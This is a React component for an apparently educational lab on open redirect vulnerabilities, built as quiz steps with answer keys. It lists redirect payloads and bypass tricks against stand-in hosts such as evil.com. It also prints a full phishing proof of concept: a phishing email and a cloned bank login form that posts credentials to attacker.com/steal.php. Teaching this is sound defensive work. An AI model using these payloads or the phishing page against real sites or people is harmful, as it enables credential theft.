import { useState } from "react";
import "./styles.scss";

export default function RedirectsScanningTask({ onComplete }) {
  const [currentStep, setCurrentStep] = useState(0);
  const [completedSteps, setCompletedSteps] = useState([]);
  const [answers, setAnswers] = useState({});

  const steps = [
    {
      id: "test-basic",
      title: "Test Basic Redirect",
      description: "Test simple redirect without validation",
      task: (
        <div className="task-box">
          <h4>Basic Redirect Testing</h4>

          <div className="test-scenario">
            <h5>Test Case 1: External Domain</h5>
            <div className="test-steps">
              <div className="test-step">
                <span className="step-num">1</span>
                <div className="step-content">
                  <strong>Original URL:</strong>
                  <code>
                    https://bank.com/redirect?url=https://bank.com/dashboard
                  </code>
                </div>
              </div>

              <div className="test-step">
                <span className="step-num">2</span>
                <div className="step-content">
                  <strong>Modified URL (Attack):</strong>
                  <code>https://bank.com/redirect?url=https://evil.com</code>
                </div>
              </div>

              <div className="test-step">
                <span className="step-num">3</span>
                <div className="step-content">
                  <strong>Expected Result:</strong>
                  <div className="result-options">
                    <div className="result vulnerable">
                      <strong>VULNERABLE:</strong>
                      <p>Redirects to evil.com</p>
                    </div>
                    <div className="result secure">
                      <strong>SECURE:</strong>
                      <p>403 Forbidden or stays on bank.com</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div className="poc-creation">
            <h5>Creating Proof of Concept HTML:</h5>
            <pre>
              <code>{`<!DOCTYPE html>
<html>
<head>
  <title>You won $1000!</title>
</head>
<body>
  <h1>Claim your prize!</h1>
  <p>Click below to verify your bank account:</p>
  
  <!-- Malicious link using trusted domain -->
  <a href="https://trusted-bank.com/redirect?url=https://fake-bank.com/login">
    Verify Account
  </a>
  
  <!-- Victim clicks, gets redirected from real bank to phishing site -->
</body>
</html>`}</code>
            </pre>
          </div>

          <div className="info-box">
            <h5>Why This Works:</h5>
            <ul>
              <li>→ Link starts with trusted domain (trusted-bank.com)</li>
              <li>→ Victim sees trusted domain in email/message</li>
              <li>→ Real website redirects to attacker's phishing page</li>
              <li>→ Victim enters credentials on fake site</li>
            </ul>
          </div>

          <div className="warning-box">
            <h5>Real-World Impact:</h5>
            <p>
              <strong>Google OAuth Redirect (2014):</strong>
              <br />
              Attackers exploited open redirect to steal OAuth tokens by
              redirecting victims from accounts.google.com to
              attacker-controlled site.
            </p>
          </div>
        </div>
      ),
      question: "What makes open redirect effective for phishing?",
      options: [
        "It's very fast",
        "URL starts with trusted domain, bypassing user suspicion and email filters",
        "It improves SEO",
        "It makes the site load faster",
      ],
      correct: 1,
      explanation:
        "Open redirects are effective because the URL starts with a legitimate, trusted domain that users recognize, making phishing attacks more convincing and bypassing security filters.",
    },
    {
      id: "test-encoding",
      title: "Test URL Encoding Bypass",
      description: "Use URL encoding to bypass filters",
      task: (
        <div className="task-box">
          <h4>URL Encoding Bypass Techniques</h4>

          <div className="encoding-technique">
            <h5>Technique 1: URL Encoding</h5>
            <div className="encoding-examples">
              <div className="encoding-example">
                <strong>Original (blocked):</strong>
                <code>?redirect=https://evil.com</code>
              </div>
              <div className="encoding-example bypass">
                <strong>URL Encoded (may bypass):</strong>
                <code>?redirect=https%3A%2F%2Fevil.com</code>
              </div>
              <div className="encoding-example bypass">
                <strong>Double Encoded:</strong>
                <code>?redirect=https%253A%252F%252Fevil.com</code>
              </div>
            </div>
          </div>

          <div className="encoding-technique">
            <h5>Technique 2: Mixed Encoding</h5>
            <div className="encoding-examples">
              <div className="encoding-example bypass">
                <strong>Partial encoding:</strong>
                <code>?url=https%3A//evil.com</code>
              </div>
              <div className="encoding-example bypass">
                <strong>Unicode encoding:</strong>
                <code>?url=https://evil%E3%80%82com</code>
              </div>
            </div>
          </div>

          <div className="encoding-technique">
            <h5>Technique 3: Null Byte Injection</h5>
            <div className="encoding-examples">
              <div className="encoding-example bypass">
                <code>?redirect=https://trusted.com%00.evil.com</code>
                <p className="explanation">
                  Some parsers stop at %00 (null byte)
                </p>
              </div>
            </div>
          </div>

          <div className="test-methodology">
            <h5>Testing Steps:</h5>
            <ol>
              <li>
                <strong>Test plain URL</strong>
                <code>?url=https://evil.com</code>
              </li>
              <li>
                <strong>If blocked, try URL encoding</strong>
                <code>?url=https%3A%2F%2Fevil.com</code>
              </li>
              <li>
                <strong>Try double encoding</strong>
                <code>?url=https%253A%252F%252Fevil.com</code>
              </li>
              <li>
                <strong>Try mixed case</strong>
                <code>?url=hTTps://evil.com</code>
              </li>
              <li>
                <strong>Try different protocols</strong>
                <code>?url=//evil.com</code> (protocol-relative)
              </li>
            </ol>
          </div>

          <div className="vulnerability-scenario">
            <h5>Why Encoding Works:</h5>
            <div className="code-comparison">
              <div className="code-block vulnerable">
                <strong>VULNERABLE CODE:</strong>
                <pre>
                  <code>{`// Validation before decoding
if (url.includes('evil.com')) {
  return 'Blocked';
}
res.redirect(decodeURIComponent(url)); // Decodes AFTER check!`}</code>
                </pre>
              </div>
              <div className="code-block secure">
                <strong>SECURE CODE:</strong>
                <pre>
                  <code>{`// Decode BEFORE validation
const decoded = decodeURIComponent(url);
if (decoded.includes('evil.com')) {
  return 'Blocked';
}
res.redirect(decoded);`}</code>
                </pre>
              </div>
            </div>
          </div>
        </div>
      ),
      question: "Why can URL encoding bypass validation?",
      options: [
        "It makes URLs shorter",
        "Validation checks original encoded string, but redirect uses decoded URL",
        "It improves performance",
        "Browsers don't support encoding",
      ],
      correct: 1,
      explanation:
        "URL encoding can bypass validation when the application checks the encoded string for malicious content but then decodes and redirects to the decoded URL, which wasn't properly validated.",
    },
    {
      id: "test-whitelist",
      title: "Test Whitelist Bypass",
      description: "Bypass weak whitelist implementations",
      task: (
        <div className="task-box">
          <h4>Whitelist Bypass Techniques</h4>

          <div className="bypass-technique">
            <h5>Technique 1: Subdomain Trick</h5>
            <div className="bypass-example">
              <div className="allowed">
                <strong>Allowed domain:</strong>
                <code>trusted.com</code>
              </div>
              <div className="bypass">
                <strong>Bypass:</strong>
                <code>trusted.com.evil.com</code>
                <p>If validation uses: url.includes('trusted.com')</p>
              </div>
            </div>
          </div>

          <div className="bypass-technique">
            <h5>Technique 2: @ Symbol</h5>
            <div className="bypass-example">
              <div className="bypass">
                <code>https://trusted.com@evil.com</code>
                <p>Browser goes to evil.com, 'trusted.com' is username part!</p>
              </div>
              <div className="bypass">
                <code>https://trusted.com:password@evil.com</code>
                <p>Same trick with credentials</p>
              </div>
            </div>
          </div>

          <div className="bypass-technique">
            <h5>Technique 3: Path Manipulation</h5>
            <div className="bypass-example">
              <div className="allowed">
                <strong>Validation checks domain:</strong>
                <code>if (domain === 'trusted.com')</code>
              </div>
              <div className="bypass">
                <strong>Bypass with path:</strong>
                <code>https://evil.com/trusted.com</code>
                <p>If validator only checks URL string, not parsed domain</p>
              </div>
            </div>
          </div>

          <div className="bypass-technique">
            <h5>Technique 4: Backslash vs Forward Slash</h5>
            <div className="bypass-example">
              <div className="bypass">
                <code>https://trusted.com\\@evil.com</code>
                <p>Some parsers treat \\ differently than //</p>
              </div>
              <div className="bypass">
                <code>https://trusted.com\\.evil.com</code>
                <p>Browser normalizes to evil.com</p>
              </div>
            </div>
          </div>

          <div className="real-world-cases">
            <h5>Real Vulnerabilities:</h5>
            <div className="case-study">
              <strong>Shopify (2015)</strong>
              <p>Whitelist: myshopify.com</p>
              <p>Bypass: myshopify.com.evil.com</p>
              <code>
                https://store.myshopify.com/account?return_to=myshopify.com.evil.com
              </code>
            </div>
            <div className="case-study">
              <strong>Steam (2016)</strong>
              <p>Used @ symbol bypass</p>
              <code>
                https://steamcommunity.com/openid/login?openid.return_to=https://steamcommunity.com@evil.com
              </code>
            </div>
          </div>

          <div className="testing-checklist">
            <h5>Whitelist Bypass Checklist:</h5>
            <ul>
              <li>
                <input type="checkbox" disabled />
                <span>trusted.com.evil.com (subdomain trick)</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>trusted.com@evil.com (@ symbol)</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>evil.com/trusted.com (path trick)</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>evil.com?target=trusted.com (query param)</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>trusted.com\\@evil.com (backslash)</span>
              </li>
              <li>
                <input type="checkbox" disabled />
                <span>trusted.com%00.evil.com (null byte)</span>
              </li>
            </ul>
          </div>
        </div>
      ),
      question: "How does https://trusted.com@evil.com work?",
      options: [
        "Goes to trusted.com",
        "Browser treats 'trusted.com' as username and goes to evil.com",
        "Invalid URL",
        "Goes to both sites",
      ],
      correct: 1,
      explanation:
        "In URLs, the @ symbol separates credentials from the hostname. So 'trusted.com' becomes the username part, and the browser actually connects to 'evil.com'.",
    },
    {
      id: "create-poc",
      title: "Create Complete PoC",
      description: "Build full phishing proof of concept",
      task: (
        <div className="task-box">
          <h4>Complete Phishing PoC</h4>

          <div className="poc-structure">
            <h5>Attack Flow:</h5>
            <div className="attack-flow">
              <div className="flow-step">
                <span className="flow-num">1</span>
                <div className="flow-content">
                  <strong>Setup Phishing Page</strong>
                  <p>Create fake login page identical to target</p>
                  <code>https://attacker.com/fake-bank-login.html</code>
                </div>
              </div>

              <div className="flow-arrow">↓</div>

              <div className="flow-step">
                <span className="flow-num">2</span>
                <div className="flow-content">
                  <strong>Craft Malicious Link</strong>
                  <p>Use open redirect with trusted domain</p>
                  <code>
                    https://real-bank.com/redirect?url=https://attacker.com/fake-bank-login.html
                  </code>
                </div>
              </div>

              <div className="flow-arrow">↓</div>

              <div className="flow-step">
                <span className="flow-num">3</span>
                <div className="flow-content">
                  <strong>Send Phishing Email</strong>
                  <p>Email with urgent message and malicious link</p>
                  <pre>
                    <code>{`Subject: Urgent: Verify your account!

Dear customer,

Suspicious activity detected. Click below to verify:

https://real-bank.com/redirect?url=...

[Verify Now Button]`}</code>
                  </pre>
                </div>
              </div>

              <div className="flow-arrow">↓</div>

              <div className="flow-step">
                <span className="flow-num">4</span>
                <div className="flow-content">
                  <strong>Victim Clicks</strong>
                  <p>Sees trusted domain, clicks link</p>
                </div>
              </div>

              <div className="flow-arrow">↓</div>

              <div className="flow-step">
                <span className="flow-num">5</span>
                <div className="flow-content">
                  <strong>Redirect Happens</strong>
                  <p>Real bank redirects to attacker's fake page</p>
                </div>
              </div>

              <div className="flow-arrow">↓</div>

              <div className="flow-step">
                <span className="flow-num">6</span>
                <div className="flow-content">
                  <strong>Credentials Stolen</strong>
                  <p>Victim enters credentials on fake page</p>
                  <code>
                    username: victim@email.com
                    <br />
                    password: ••••••••
                  </code>
                </div>
              </div>
            </div>
          </div>

          <div className="poc-code">
            <h5>Phishing Page Example:</h5>
            <pre>
              <code>{`<!DOCTYPE html>
<html>
<head>
  <title>Bank Login - Security Check</title>
  <style>
    /* Identical styling to real bank */
    body { font-family: Arial; background: #f5f5f5; }
    .login-box { 
      max-width: 400px; 
      margin: 100px auto; 
      background: white; 
      padding: 30px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    input { width: 100%; padding: 10px; margin: 10px 0; }
    button { 
      width: 100%; 
      padding: 15px; 
      background: #0066cc; 
      color: white; 
      border: none; 
      cursor: pointer; 
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="stolen-bank-logo.png" alt="Bank Logo"/>
    <h2>Security Verification Required</h2>
    <p>Please re-enter your credentials to continue.</p>
    
    <form action="https://attacker.com/steal.php" method="POST">
      <input type="text" name="username" placeholder="Username" required/>
      <input type="password" name="password" placeholder="Password" required/>
      <button type="submit">Verify Account</button>
    </form>
    
    <p style="font-size: 12px; color: #666;">
      © 2024 Real Bank Inc. All rights reserved.
    </p>
  </div>
</body>
</html>`}</code>
            </pre>
          </div>

          <div className="success-metrics">
            <h5>PoC Success Criteria:</h5>
            <div className="metrics-grid">
              <div className="metric">
                <strong>✓ URL looks legitimate</strong>
                <p>Starts with trusted domain</p>
              </div>
              <div className="metric">
                <strong>✓ Phishing page identical</strong>
                <p>Same design/branding as real site</p>
              </div>
              <div className="metric">
                <strong>✓ Credentials captured</strong>
                <p>Logs to attacker's server</p>
              </div>
              <div className="metric">
                <strong>✓ After-redirect realistic</strong>
                <p>Shows error or forwards to real site</p>
              </div>
            </div>
          </div>

          <div className="success-box">
            <h5>Scanning Phase Complete!</h5>
            <p>
              You've learned how to test open redirects and create proof of
              concept attacks.
            </p>
          </div>
        </div>
      ),
      question: "What makes a redirect-based phishing attack effective?",
      options: [
        "It's faster than direct phishing",
        "Malicious link starts with trusted domain, increasing victim trust",
        "It's easier to code",
        "Email filters don't work",
      ],
      correct: 1,
      explanation:
        "Open redirect phishing is effective because the malicious URL starts with a legitimate, trusted domain that victims recognize and trust, making them more likely to click and less likely to be caught by security filters.",
    },
  ];

  const handleAnswer = (stepIndex, selectedOption) => {
    const step = steps[stepIndex];
    const isCorrect = selectedOption === step.correct;

    setAnswers((prev) => ({
      ...prev,
      [stepIndex]: {
        selected: selectedOption,
        correct: isCorrect,
      },
    }));

    if (isCorrect && !completedSteps.includes(stepIndex)) {
      const newCompleted = [...completedSteps, stepIndex];
      setCompletedSteps(newCompleted);

      if (newCompleted.length === steps.length) {
        onComplete?.("scanning");
      }
    }
  };

  const goNext = () => {
    if (currentStep < steps.length - 1) {
      setCurrentStep(currentStep + 1);
    }
  };

  const goPrev = () => {
    if (currentStep > 0) {
      setCurrentStep(currentStep - 1);
    }
  };

  const handleRestart = () => {
    setCurrentStep(0);
    setCompletedSteps([]);
    setAnswers({});
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const step = steps[currentStep];
  const answered = answers[currentStep];

  return (
    <div className="redirects-scanning-container">
      <div className="content-section">
        <h2 className="step-title">{step.title}</h2>
        <p className="step-description">{step.description}</p>

        {step.task}

        <div className="question-container">
          <h4 className="question-title">{step.question}</h4>

          <div className="options-container">
            {step.options.map((option, idx) => {
              const isSelected = answered?.selected === idx;
              const isCorrect = idx === step.correct;
              const showResult = answered && isSelected;

              return (
                <button
                  key={idx}
                  onClick={() => handleAnswer(currentStep, idx)}
                  disabled={answered !== undefined}
                  className={`option-button ${
                    showResult
                      ? isCorrect
                        ? "correct"
                        : "incorrect"
                      : isSelected
                      ? "selected"
                      : ""
                  }`}
                >
                  <span className="option-icon">
                    {showResult ? (isCorrect ? "✓" : "✗") : "○"}
                  </span>
                  {option}
                </button>
              );
            })}
          </div>

          {answered && (
            <div
              className={`feedback-box ${
                answered.correct ? "correct" : "incorrect"
              }`}
            >
              <p className="feedback-title">
                {answered.correct ? "Correct!" : "Incorrect"}
              </p>
              <p className="feedback-explanation">{step.explanation}</p>
              {!answered.correct && (
                <div className="restart-prompt">
                  <p className="restart-text">
                    Don't worry! Learning from mistakes is part of the process.
                    You can restart this phase to try again.
                  </p>
                  <button onClick={handleRestart} className="restart-button">
                    Restart Phase
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
        <div className="navigation-buttons">
          <button
            onClick={goPrev}
            disabled={currentStep === 0}
            className="nav-button prev-button"
          >
            Previous
          </button>

          {completedSteps.includes(currentStep) &&
            currentStep < steps.length - 1 && (
              <button onClick={goNext} className="nav-button next-button">
                Next
              </button>
            )}

          {completedSteps.length === steps.length && (
            <button className="nav-button complete-button">
              Phase completed!
            </button>
          )}
        </div>
      </div>
    </div>
  );
}
